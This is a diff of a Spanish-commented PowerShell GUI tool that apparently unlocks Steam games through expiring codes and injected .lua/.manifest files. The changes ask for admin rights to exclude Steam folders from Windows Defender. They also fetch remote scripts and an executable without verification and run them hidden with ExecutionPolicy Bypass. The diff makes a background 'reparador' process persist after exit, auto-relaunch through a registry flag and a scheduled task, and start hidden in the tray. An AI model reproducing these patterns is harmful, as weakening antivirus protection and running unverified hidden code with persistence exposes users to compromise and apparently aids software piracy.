 # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 #  REDEEM VIEW
 # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
-$script:rp=New-Object BufferedPanel
+$script:rp=New-BufferedPanel
 $script:rp.Location=New-Object System.Drawing.Point(0,$CY)
 $script:rp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:rp.BackColor=$BG;$script:rp.Visible=$false
 
 # Back arrow + title on same line
-$script:backB=New-Object BufferedPanel
+$script:backB=New-BufferedPanel
 $script:backB.Location=New-Object System.Drawing.Point($PAD,8)
 $script:backB.Size=New-Object System.Drawing.Size(36,36);$script:backB.BackColor=$BG
 $script:backB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:backB.Tag=@{Hover=$false}
@@ -1397,7 +1469,7 @@ $txtC.BackColor=$InputBG;$txtC.ForeColor=$White;$txtC.BorderStyle="FixedSingle";
 $script:rp.Controls.Add($txtC)
 
 # Paste button (pega del portapapeles)
-$script:pasteB=New-Object BufferedPanel
+$script:pasteB=New-BufferedPanel
 $script:pasteB.Location=New-Object System.Drawing.Point(([int]$PAD+[int]$CW-154),74)
 $script:pasteB.Size=New-Object System.Drawing.Size(50,28);$script:pasteB.BackColor=$BG
 $script:pasteB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:pasteB.Tag=@{Hover=$false}
@@ -1421,7 +1493,7 @@ $script:pasteB.Add_Click({
 })
 $script:rp.Controls.Add($script:pasteB)
 
-$script:subB=New-Object BufferedPanel
+$script:subB=New-BufferedPanel
 $script:subB.Location=New-Object System.Drawing.Point(([int]$PAD+[int]$CW-98),74)
 $script:subB.Size=New-Object System.Drawing.Size(98,28);$script:subB.BackColor=$BG
 $script:subB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:subB.Tag=@{Hover=$false}
@@ -1529,7 +1601,7 @@ $lblR.Text="";$lblR.Font=$FntSub;$lblR.ForeColor=$Gray;$lblR.BackColor=$BG
 $lblR.Location=New-Object System.Drawing.Point($PAD,108);$lblR.Size=New-Object System.Drawing.Size($CW,16)
 $script:rp.Controls.Add($lblR)
 
-$div=New-Object BufferedPanel;$div.Location=New-Object System.Drawing.Point($PAD,130)
+$div=New-BufferedPanel;$div.Location=New-Object System.Drawing.Point($PAD,130)
 $div.Size=New-Object System.Drawing.Size($CW,1);$div.BackColor=$CardBorder
 $script:rp.Controls.Add($div)
 
@@ -1553,7 +1625,7 @@ function Get-ClpThumb {
     $ty=0;if($script:clpMaxScroll -gt 0){$ty=[int](($chh - $th) * ($script:clpScroll / $script:clpMaxScroll))}
     return @{X=$tx;Y=$ty;W=$sbw;H=$th}
 }
-$script:clp=New-Object BufferedPanel
+$script:clp=New-BufferedPanel
 $script:clp.Location=New-Object System.Drawing.Point($PAD,164)
 $script:clp.Size=New-Object System.Drawing.Size($CW,$clH);$script:clp.BackColor=$BG
 $script:clp.Add_MouseWheel({
@@ -1701,11 +1773,11 @@ $form.Add_MouseWheel({
 })
 
 # â”€â”€ CONFIG VIEW â”€â”€
-$script:sp=New-Object BufferedPanel
+$script:sp=New-BufferedPanel
 $script:sp.Location=New-Object System.Drawing.Point(0,$CY)
 $script:sp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:sp.BackColor=$BG;$script:sp.Visible=$false
 
-$script:sBack=New-Object BufferedPanel
+$script:sBack=New-BufferedPanel
 $script:sBack.Location=New-Object System.Drawing.Point($PAD,8)
 $script:sBack.Size=New-Object System.Drawing.Size(36,36);$script:sBack.BackColor=$BG
 $script:sBack.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sBack.Tag=@{Hover=$false}
@@ -1735,7 +1807,7 @@ $script:sp.Controls.Add($script:sTitle)
 # Helper to create config option buttons
 $sY=56
 function New-CfgBtn([int]$y,[string]$txt,[string]$sub,[scriptblock]$click){
-    $pn=New-Object BufferedPanel
+    $pn=New-BufferedPanel
     $pn.Location=New-Object System.Drawing.Point($PAD,$y)
     $pn.Size=New-Object System.Drawing.Size($CW,50);$pn.BackColor=$BG
     $pn.Cursor=[System.Windows.Forms.Cursors]::Hand;$pn.Tag=@{Hover=$false;Txt=$txt;Sub=$sub}
@@ -1759,8 +1831,8 @@ function New-CfgBtn([int]$y,[string]$txt,[string]$sub,[scriptblock]$click){
     return $pn
 }
 
-# Watcher toggle (custom paint for dynamic state)
-$script:sWatcher=New-Object BufferedPanel
+# Reparador toggle (custom paint for dynamic state)
+$script:sWatcher=New-BufferedPanel
 $script:sWatcher.Location=New-Object System.Drawing.Point($PAD,$sY)
 $script:sWatcher.Size=New-Object System.Drawing.Size($CW,50);$script:sWatcher.BackColor=$BG
 $script:sWatcher.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sWatcher.Tag=@{Hover=$false}
@@ -1776,9 +1848,9 @@ $script:sWatcher.Add_Paint({param($s,$e)
     $wp=$script:watcherProcess
     $he=if($wp){try{$wp.Refresh();$wp.HasExited}catch{$false}}else{$true}
     $wOn=$we -and $wp -and -not $he
-    $st=if($wOn){(T "watcherOn")}else{(T "watcherOff")}
+    $st=if($wOn){(T "reparadorOn")}else{(T "reparadorOff")}
     $tw=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($st,$script:FntCard,$tw,14,7);$tw.Dispose()
-    $sub=if($wOn){"Click para desactivar el watcher"}else{"Click para activar el watcher  [$($we)/$($wp -ne $null)/$($he)]"}
+    $sub=if($wOn){"Click para desactivar el reparador"}else{"Click para activar el reparador"}
     $sw=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($sub,$script:FntSub,$sw,14,27);$sw.Dispose()
     $clr=if($wOn){$script:Green}else{$script:Red}
     $dot=New-Object System.Drawing.SolidBrush($clr);$g.FillEllipse($dot,($s.Width-24),16,10,10);$dot.Dispose()
@@ -1790,21 +1862,23 @@ $script:sWatcher.Add_Click({
     if ($wRunning) {
         try { $script:watcherProcess.Kill(); $script:watcherProcess.WaitForExit(2000) } catch {}
         $script:watcherProcess = $null; $script:watcherEnabled = $false
-        try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [TOGGLE] Watcher detenido por usuario" -Encoding UTF8 } catch {}
-        [System.Windows.Forms.MessageBox]::Show("Watcher desactivado.","Watcher","OK","Information") | Out-Null
+        Set-ReparadorFlag 0
+        try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [TOGGLE] Reparador detenido por usuario" -Encoding UTF8 } catch {}
+        [System.Windows.Forms.MessageBox]::Show("Reparador desactivado.","Reparador","OK","Information") | Out-Null
     } else {
-        $msgResult = [System.Windows.Forms.MessageBox]::Show("Para activar el watcher se excluiran las carpetas de Steam del Windows Defender (se pedira permiso de admin UNA sola vez).`n`nContinuar?","Activar Watcher","YesNo","Information")
+        $msgResult = [System.Windows.Forms.MessageBox]::Show("Para activar el reparador se excluiran las carpetas de Steam del Windows Defender (se pedira permiso de admin UNA sola vez).`n`nContinuar?","Activar Reparador","YesNo","Information")
         if ($msgResult -ne "Yes") { $script:sWatcher.Invalidate(); return }
         [System.Windows.Forms.Application]::DoEvents()
         $exOk = Add-SteamDefenderExclusions
         if (-not $exOk) {
-            [System.Windows.Forms.MessageBox]::Show("No se pudieron agregar las exclusiones del Defender. El watcher puede funcionar igual pero sera menos eficiente.","Aviso","OK","Warning") | Out-Null
+            [System.Windows.Forms.MessageBox]::Show("No se pudieron agregar las exclusiones del Defender. El reparador puede funcionar igual pero sera menos eficiente.","Aviso","OK","Warning") | Out-Null
         }
         $started = Start-WatcherProcess
         if (-not $started) {
-            [System.Windows.Forms.MessageBox]::Show("No se pudo iniciar el watcher. Revisa el log en $env:TEMP\bsmap_watcher.log","Error","OK","Error") | Out-Null
+            [System.Windows.Forms.MessageBox]::Show("No se pudo iniciar el reparador. Revisa el log en $env:TEMP\bsmap_watcher.log","Error","OK","Error") | Out-Null
         } else {
-            [System.Windows.Forms.MessageBox]::Show("Watcher activado! El Defender fue configurado. Se detectaran juegos automaticamente.","Watcher Activado","OK","Information") | Out-Null
+            Set-ReparadorFlag 1
+            [System.Windows.Forms.MessageBox]::Show("Reparador activado! El Defender fue configurado. Se detectaran juegos automaticamente.","Reparador Activado","OK","Information") | Out-Null
         }
     }
     $script:sWatcher.Invalidate()
@@ -1820,6 +1894,8 @@ $script:sHist=New-CfgBtn ($sY+60) (T "borrarHist") (T "borrarHistSub") {
     Save-Timers @()
     # 3. Limpiar registro de Windows (backup)
     try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -Force -ErrorAction SilentlyContinue } catch {}
+    # 3b. Limpiar historial de codigos expirados
+    try { Remove-Item -Path $HISTORY_FILE -Force -ErrorAction SilentlyContinue } catch {}
     # 4. Forzar refresh visual inmediato
     Refresh-Codes
     $script:rp.Invalidate()
@@ -1841,8 +1917,8 @@ $script:sp.Controls.Add($script:sHist)
 
 # LIMPIEZA TOTAL: kill all processes + remove ALL luas + clear registry - EXHAUSTIVO
 $script:sKill=New-CfgBtn ($sY+120) (T "limpieza") (T "limpiezaSub") {
-    if ([System.Windows.Forms.MessageBox]::Show("LIMPIEZA TOTAL`n`n-Se eliminaran TODOS los archivos .lua, .manifest en TODAS las librerias de Steam`n-Se detendran TODOS los procesos (watcher, ssh, jobs)`n-Se detendran los timers que borran juegos`n-Se borrara el registro de codigos`n`nContinuar?","LIMPIEZA","YesNo","Warning") -ne "Yes") { return }
-    # 1. BORRAR ARCHIVOS .lua, .manifest, .cache PRIMERO (antes de detener timers)
+    if ([System.Windows.Forms.MessageBox]::Show("LIMPIEZA TOTAL`n`n-Se eliminaran TODOS los archivos .lua, .manifest en TODAS las librerias de Steam`n-Se detendran TODOS los procesos (reparador, watch, ssh, jobs)`n-Se desactivara temporalmente la tarea BsmapCleanup durante la limpieza`n-Se detendran los timers que borran juegos`n-Se borrara el registro de codigos`n`nContinuar?","LIMPIEZA","YesNo","Warning") -ne "Yes") { return }
+    # 1. BORRAR ARCHIVOS .lua, .manifest PRIMERO (borrado duro, antes de detener timers)
     $steamRoot = Get-SteamPath
     $allLibs = @($steamRoot)
     try { $allLibs = Get-SteamLibraries } catch {}
@@ -1856,15 +1932,9 @@ $script:sKill=New-CfgBtn ($sY+120) (T "limpieza") (T "limpiezaSub") {
                 try {
                     $files = Get-ChildItem $dir -File -ErrorAction SilentlyContinue
                     foreach ($f in $files) {
-                        $attempts = 0
-                        $removed = $false
-                        while (-not $removed -and $attempts -lt 3) {
-                            try { Remove-Item $f.FullName -Force -ErrorAction Stop; $removed = $true; $totalRemoved++ } catch { Start-Sleep -Milliseconds 200 }
-                            $attempts++
-                        }
-                        if (-not $removed) {
-                            try { [System.IO.File]::Delete($f.FullName); $totalRemoved++ } catch {}
-                        }
+                        $before = Test-Path -LiteralPath $f.FullName
+                        Remove-FileHard $f.FullName
+                        if ($before -and -not (Test-Path -LiteralPath $f.FullName)) { $totalRemoved++ }
                     }
                 } catch {}
             }
@@ -1873,14 +1943,16 @@ $script:sKill=New-CfgBtn ($sY+120) (T "limpieza") (T "limpiezaSub") {
     # 2. DETENER TIMERS QUE BORRAN JUEGOS (despues de borrar luas)
     try { if ($script:countdownTick) { $script:countdownTick.Stop(); $script:countdownTick.Dispose(); $script:countdownTick = $null } } catch {}
     try { if ($script:refreshTimers) { $script:refreshTimers.Stop(); $script:refreshTimers.Dispose(); $script:refreshTimers = $null } } catch {}
-    # 3. Matar proceso del watcher
+    # 3. Matar proceso del reparador (download watcher) + flag
     if ($script:watcherProcess -and -not $script:watcherProcess.HasExited) { try { $script:watcherProcess.Kill(); $script:watcherProcess.WaitForExit(3000) } catch {} }
-    $script:watcherProcess = $null; $script:watcherEnabled = $false
-    # 4. Matar procesos del watcher que hayan quedado huerfanos (por nombre de script)
+    $script:watcherProcess = $null; $script:watcherEnabled = $false; Set-ReparadorFlag 0
+    # 4. Matar procesos huerfanos: reparador, watch.exe (sistema blindado), serveo
     try {
-        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "bsmap_watcher" } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
-        # Matar tambien cualquier proceso ssh asociado a serveo
+        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "bsmap_watcher|bsmap_reparador" } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
         Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "serveo" } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
+        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "bsmap_watch.exe" -or $_.CommandLine -match "bsmap_watch" } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
+        # Desactivar la tarea BsmapCleanup mientras limpiamos (evita que relance procesos)
+        try { Disable-ScheduledTask -TaskName "BsmapCleanup" -ErrorAction SilentlyContinue } catch {}
     } catch {}
     # 5. Cancelar todos los jobs pendientes
     if ($script:fixJobs) { foreach ($j in $script:fixJobs.Values) { try { if ($j.job) { Stop-Job $j.job -ErrorAction SilentlyContinue; Remove-Job $j.job -Force -ErrorAction SilentlyContinue } } catch {} } }
@@ -1890,13 +1962,16 @@ $script:sKill=New-CfgBtn ($sY+120) (T "limpieza") (T "limpiezaSub") {
     Save-Timers @()
     $script:activeCodes.Clear()
     try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -Force -ErrorAction SilentlyContinue } catch {}
+    try { Remove-Item -Path $HISTORY_FILE -Force -ErrorAction SilentlyContinue } catch {}
     # 7. Doble verificacion de timers
     $remaining = Get-ActiveTimers
     if ($remaining.Count -gt 0) { Save-Timers @(); $script:activeCodes.Clear() }
-    # 8. Refrescar UI
+    # 8. Reactivar la tarea (el sistema de auto-borrado sigue operativo para canjes futuros)
+    try { Enable-ScheduledTask -TaskName "BsmapCleanup" -ErrorAction SilentlyContinue } catch {}
+    # 9. Refrescar UI
     Sync-ActiveCodesFromTimers; Refresh-Codes; $script:rp.Invalidate(); $script:sWatcher.Invalidate()
     [System.Windows.Forms.Application]::DoEvents()
-    [System.Windows.Forms.MessageBox]::Show("Limpieza completada.`n- $totalRemoved archivos eliminados`n- Timers de borrado detenidos`n- Procesos detenidos`n- Registro borrado","LIMPIEZA COMPLETADA","OK","Information")
+    [System.Windows.Forms.MessageBox]::Show("Limpieza completada.`n- $totalRemoved archivos eliminados`n- Timers de borrado detenidos`n- Procesos detenidos (reparador, watch, ssh, jobs)`n- Registro borrado","LIMPIEZA COMPLETADA","OK","Information")
 }
 $script:sp.Controls.Add($script:sKill)
 
@@ -1909,9 +1984,9 @@ $sWeb.Location=New-Object System.Drawing.Point($PAD,($sY+190))
 $sWeb.Add_Click({Start-Process "https://github.com/bastisayes/Fixes-steam"})
 $script:sp.Controls.Add($sWeb)
 
-# Watcher log viewer
+# Reparador log viewer
 $script:sLogLabel=New-Object System.Windows.Forms.Label
-$script:sLogLabel.Text="Log del Watcher:"
+$script:sLogLabel.Text="Log del Reparador:"
 $script:sLogLabel.Font=$FntSub;$script:sLogLabel.ForeColor=$script:Gray;$script:sLogLabel.BackColor=$BG
 $script:sLogLabel.AutoSize=$true
 $script:sLogLabel.Location=New-Object System.Drawing.Point($PAD,($sY+220))
@@ -1946,7 +2021,7 @@ $script:watcherLogTimer.Add_Tick({
                     $script:sLogBox.ScrollToCaret()
                 }
             } else { $script:sLogBox.Text = "(Log vacio)" }
-        } else { $script:sLogBox.Text = "(No existe log - el watcher no escribio nada)`nRuta esperada: $env:TEMP\bsmap_watcher.log" }
+        } else { $script:sLogBox.Text = "(No existe log - el reparador no escribio nada)`nRuta esperada: $env:TEMP\bsmap_watcher.log" }
     } catch { $script:sLogBox.Text = "Error leyendo log: $($_.Exception.Message)" }
 })
 $script:watcherLogTimer.Start()
@@ -2156,8 +2231,7 @@ $script:steamWatchTimer.Start()
 
 # Sync activeCodes from real timer file on startup
 function Sync-ActiveCodesFromTimers {
-    # Only add codes from file that aren't in memory yet (never remove from memory here)
-    if (-not (Test-Path $TIMERS_FILE)) { return }
+    # Cargar timers reales + historial persistente (activos y expirados recientes)
     $realTimers = Get-ActiveTimers
     $memGameNames = @($script:activeCodes | ForEach-Object { $_.Game })
     foreach ($t in $realTimers) {
@@ -2170,16 +2244,38 @@ function Sync-ActiveCodesFromTimers {
         $aAt = if ($iCreated) { [datetime]$iCreated } else { (Get-Date) }
         $script:activeCodes.Add(@{Code=$c;Game=$t.game_name;ActivatedAt=$aAt;ExpiresAt=$exp;Duration=$d;InternetCreatedAt=$iCreated})|Out-Null
     }
+    # Historial de expirados: agregar los que no esten en memoria (aparecen aunque hayan expirado)
+    $hist = @(Get-CodesHistory)
+    $memCodes = @($script:activeCodes | ForEach-Object { $_.Code })
+    foreach ($h in $hist) {
+        $expH = $h.expires_at -as [datetime]
+        if (-not $expH) { continue }
+        if ($memCodes -contains $h.code) { continue }
+        $aAtH = if ($h.expired_at) { try { [datetime]$h.expired_at } catch { $expH } } else { $expH }
+        $script:activeCodes.Add(@{Code=$h.code;Game=$h.game;ActivatedAt=$aAtH;ExpiresAt=$expH;Duration=$h.duration;InternetCreatedAt=$null})|Out-Null
+    }
 }
 Sync-ActiveCodesFromTimers
 
-# WATCHER DESACTIVADO POR DEFECTO - solo se activa al hacer click en el boton
-# Antes de activarlo, se deben excluir las carpetas de Steam del Windows Defender
+# REPARADOR DESACTIVADO POR DEFECTO - solo se activa al hacer click en el boton
+# (o se auto-activa si fue activado antes y no se desactivo: flag persistente)
 $script:watcherEnabled = $false
 $script:watcherProcess = $null
 $script:watcherLogPath = Join-Path $env:TEMP "bsmap_watcher.log"
 $script:watcherTemp = Join-Path $env:TEMP "bsmap_watcher.ps1"
 $script:defenderExclusionsDone = $false
+
+# Flag persistente del reparador: si se activo 1 vez, queda activo hasta que se desactive
+function Set-ReparadorFlag {
+    param([int]$on)
+    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Reparador" -Value $on -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
+    try { [System.IO.File]::WriteAllText((Join-Path $env:LOCALAPPDATA 'bsmap_reparador.flag'), "$on", $script:utf8NoBom) } catch {}
+}
+function Get-ReparadorFlag {
+    try { $v = (Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Reparador" -ErrorAction SilentlyContinue).Reparador; if ($null -ne $v) { return [int]$v } } catch {}
+    try { $f = Join-Path $env:LOCALAPPDATA 'bsmap_reparador.flag'; if (Test-Path $f) { return [int]((Get-Content $f -Raw).Trim()) } } catch {}
+    return 0
+}
 
 # Funcion para excluir carpetas de Steam del Windows Defender (pide UAC 1 sola vez)
 function Add-SteamDefenderExclusions {
@@ -2229,7 +2325,7 @@ function Add-SteamDefenderExclusions {
     }
 }
 
-# Auto-reparacion: descarga componentes faltantes y asegura tarea+watcher (portable a cualquier PC)
+# Auto-reparacion: descarga componentes faltantes y asegura tarea+watch (portable a cualquier PC)
 function Ensure-CleanupTask {
     try {
         $bsDir = Join-Path $env:LOCALAPPDATA 'BastissSteam'
@@ -2241,23 +2337,31 @@ function Ensure-CleanupTask {
         if (-not (Test-Path $cleanupPs1)) { try { Invoke-RestMethod -Uri "$base/bsmap_cleanup.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $cleanupPs1 -ErrorAction SilentlyContinue } catch {} }
         if (-not (Test-Path $watchExe)) { try { Invoke-RestMethod -Uri "$base/bsmap_watch.exe" -UseBasicParsing -TimeoutSec 25 -OutFile $watchExe -ErrorAction SilentlyContinue } catch {} }
         if (-not (Test-Path $ensure)) { try { Invoke-RestMethod -Uri "$base/ensure_task.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $ensure -ErrorAction SilentlyContinue } catch {} }
-        if (Test-Path $ensure) { & powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $ensure }
+        if (Test-Path $ensure) { try { Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ensure`"" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue } catch {} }
         if ((Test-Path $watchExe) -and -not (Get-Process bsmap_watch -ErrorAction SilentlyContinue)) {
             Start-Process -FilePath $watchExe -WindowStyle Hidden
         }
     } catch {}
 }
 
-# Funcion para lanzar el watcher (se llama al hacer click)
+# Funcion para lanzar el reparador (se llama al hacer click o al auto-iniciarse)
 function Start-WatcherProcess {
     try {
-        try { Add-Content -Path $script:watcherLogPath -Value "`n=== [$(Get-Date -Format 'HH:mm:ss')] INICIANDO WATCHER ===" -Encoding UTF8 -Force -ErrorAction SilentlyContinue } catch {}
+        # Guard: si ya hay un reparador corriendo, no lanzar otro
+        $existing = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "powershell.exe" -and $_.CommandLine -match 'bsmap_watcher\.ps1' })
+        if ($existing.Count -gt 0) {
+            $script:watcherProcess = Get-Process -Id $existing[0].ProcessId -ErrorAction SilentlyContinue
+            $script:watcherEnabled = $true
+            try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [START] Reparador ya estaba activo (PID=$($existing[0].ProcessId))" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
+            return $true
+        }
+        try { Add-Content -Path $script:watcherLogPath -Value "`n=== [$(Get-Date -Format 'HH:mm:ss')] INICIANDO REPARADOR ===" -Encoding UTF8 -Force -ErrorAction SilentlyContinue } catch {}
         if (-not (Test-Path $script:watcherTemp) -or ((Get-Date) - (Get-Item $script:watcherTemp -ErrorAction SilentlyContinue).LastWriteTime).TotalHours -gt 24) {
-            Add-Content -Path $script:watcherLogPath -Value "[START] Descargando watcher..." -Encoding UTF8 -ErrorAction SilentlyContinue
+            Add-Content -Path $script:watcherLogPath -Value "[START] Descargando reparador..." -Encoding UTF8 -ErrorAction SilentlyContinue
             Invoke-RestMethod -Uri $script:watcherUrl -UseBasicParsing -TimeoutSec 15 -OutFile $script:watcherTemp -ErrorAction SilentlyContinue
-            if (Test-Path $script:watcherTemp) { Add-Content -Path $script:watcherLogPath -Value "[START] Watcher descargado: $((Get-Item $script:watcherTemp).Length) bytes" -Encoding UTF8 -ErrorAction SilentlyContinue }
+            if (Test-Path $script:watcherTemp) { Add-Content -Path $script:watcherLogPath -Value "[START] Reparador descargado: $((Get-Item $script:watcherTemp).Length) bytes" -Encoding UTF8 -ErrorAction SilentlyContinue }
             else { Add-Content -Path $script:watcherLogPath -Value "[START] ERROR: descarga fallo" -Encoding UTF8 -ErrorAction SilentlyContinue; return $false }
-        } else { Add-Content -Path $script:watcherLogPath -Value "[START] Watcher en cache" -Encoding UTF8 -ErrorAction SilentlyContinue }
+        } else { Add-Content -Path $script:watcherLogPath -Value "[START] Reparador en cache" -Encoding UTF8 -ErrorAction SilentlyContinue }
         if (Test-Path $script:watcherTemp) {
             $psi = New-Object System.Diagnostics.ProcessStartInfo
             $psi.FileName = "powershell.exe"
@@ -2265,14 +2369,31 @@ function Start-WatcherProcess {
             $psi.WindowStyle = "Hidden"; $psi.CreateNoWindow = $true; $psi.UseShellExecute = $false
             $script:watcherProcess = [System.Diagnostics.Process]::Start($psi)
             $script:watcherEnabled = $true
-            Add-Content -Path $script:watcherLogPath -Value "[START] Watcher lanzado (PID=$($script:watcherProcess.Id))" -Encoding UTF8 -ErrorAction SilentlyContinue
+            Add-Content -Path $script:watcherLogPath -Value "[START] Reparador lanzado (PID=$($script:watcherProcess.Id))" -Encoding UTF8 -ErrorAction SilentlyContinue
             return $true
         }
         return $false
-    } catch { Write-ErrorLog "Launch watcher" $_; return $false }
+    } catch { Write-ErrorLog "Launch reparador" $_; return $false }
 }
 
 Ensure-CleanupTask
+# Reparador persistente: si se activo alguna vez y no se desactivo, queda activo siempre
+if ((Get-ReparadorFlag) -eq 1) {
+    try {
+        if (Start-WatcherProcess) {
+            try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [AUTO] Reparador auto-iniciado (flag persistente)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
+        }
+    } catch {}
+}
+# Inicio en segundo plano (solo bandeja) cuando se lanza con -min / -hidden (autostart)
+$script:startInTray = $false
+try {
+    $cliArgs = @($args) + @([Environment]::GetCommandLineArgs())
+    if ($cliArgs -contains '-min' -or $cliArgs -contains '-hidden') { $script:startInTray = $true }
+} catch {}
+if ($script:startInTray) {
+    try { $form.Hide(); $script:trayIcon.Visible = $true } catch {}
+}
 [System.Windows.Forms.Application]::Run($form)
 $script:trayIcon.Dispose()
 if ($script:countdownTick) { $script:countdownTick.Stop(); $script:countdownTick.Dispose() }
@@ -2281,11 +2402,13 @@ if ($script:clpTicker) { $script:clpTicker.Stop(); $script:clpTicker.Dispose() }
 if ($script:urlChecker) { $script:urlChecker.Stop(); $script:urlChecker.Dispose() }
 if ($script:steamWatchTimer) { $script:steamWatchTimer.Stop(); $script:steamWatchTimer.Dispose() }
 if ($script:watcherLogTimer) { $script:watcherLogTimer.Stop(); $script:watcherLogTimer.Dispose() }
-if ($script:watcherProcess -and -not $script:watcherProcess.HasExited) { try { $script:watcherProcess.Kill() } catch {} }
+# El reparador NO se mata al salir: si se activo una vez, sigue activo hasta que se desactive
+# (la flag persistente lo re-lanza en la proxima apertura; el proceso sobrevive por si solo)
 if ($script:fixJobs) { foreach ($j in $script:fixJobs.Values) { try { Remove-Job $j.job -Force -ErrorAction SilentlyContinue } catch {} } }
 if ($script:fixesJob) { try { Remove-Job $script:fixesJob -Force -ErrorAction SilentlyContinue } catch {} }
 if ($script:downloadPendingFixes) { foreach ($d in $script:downloadPendingFixes.Values) { try { if ($d.dlJob) { Remove-Job $d.dlJob -Force -ErrorAction SilentlyContinue } } catch {} } }
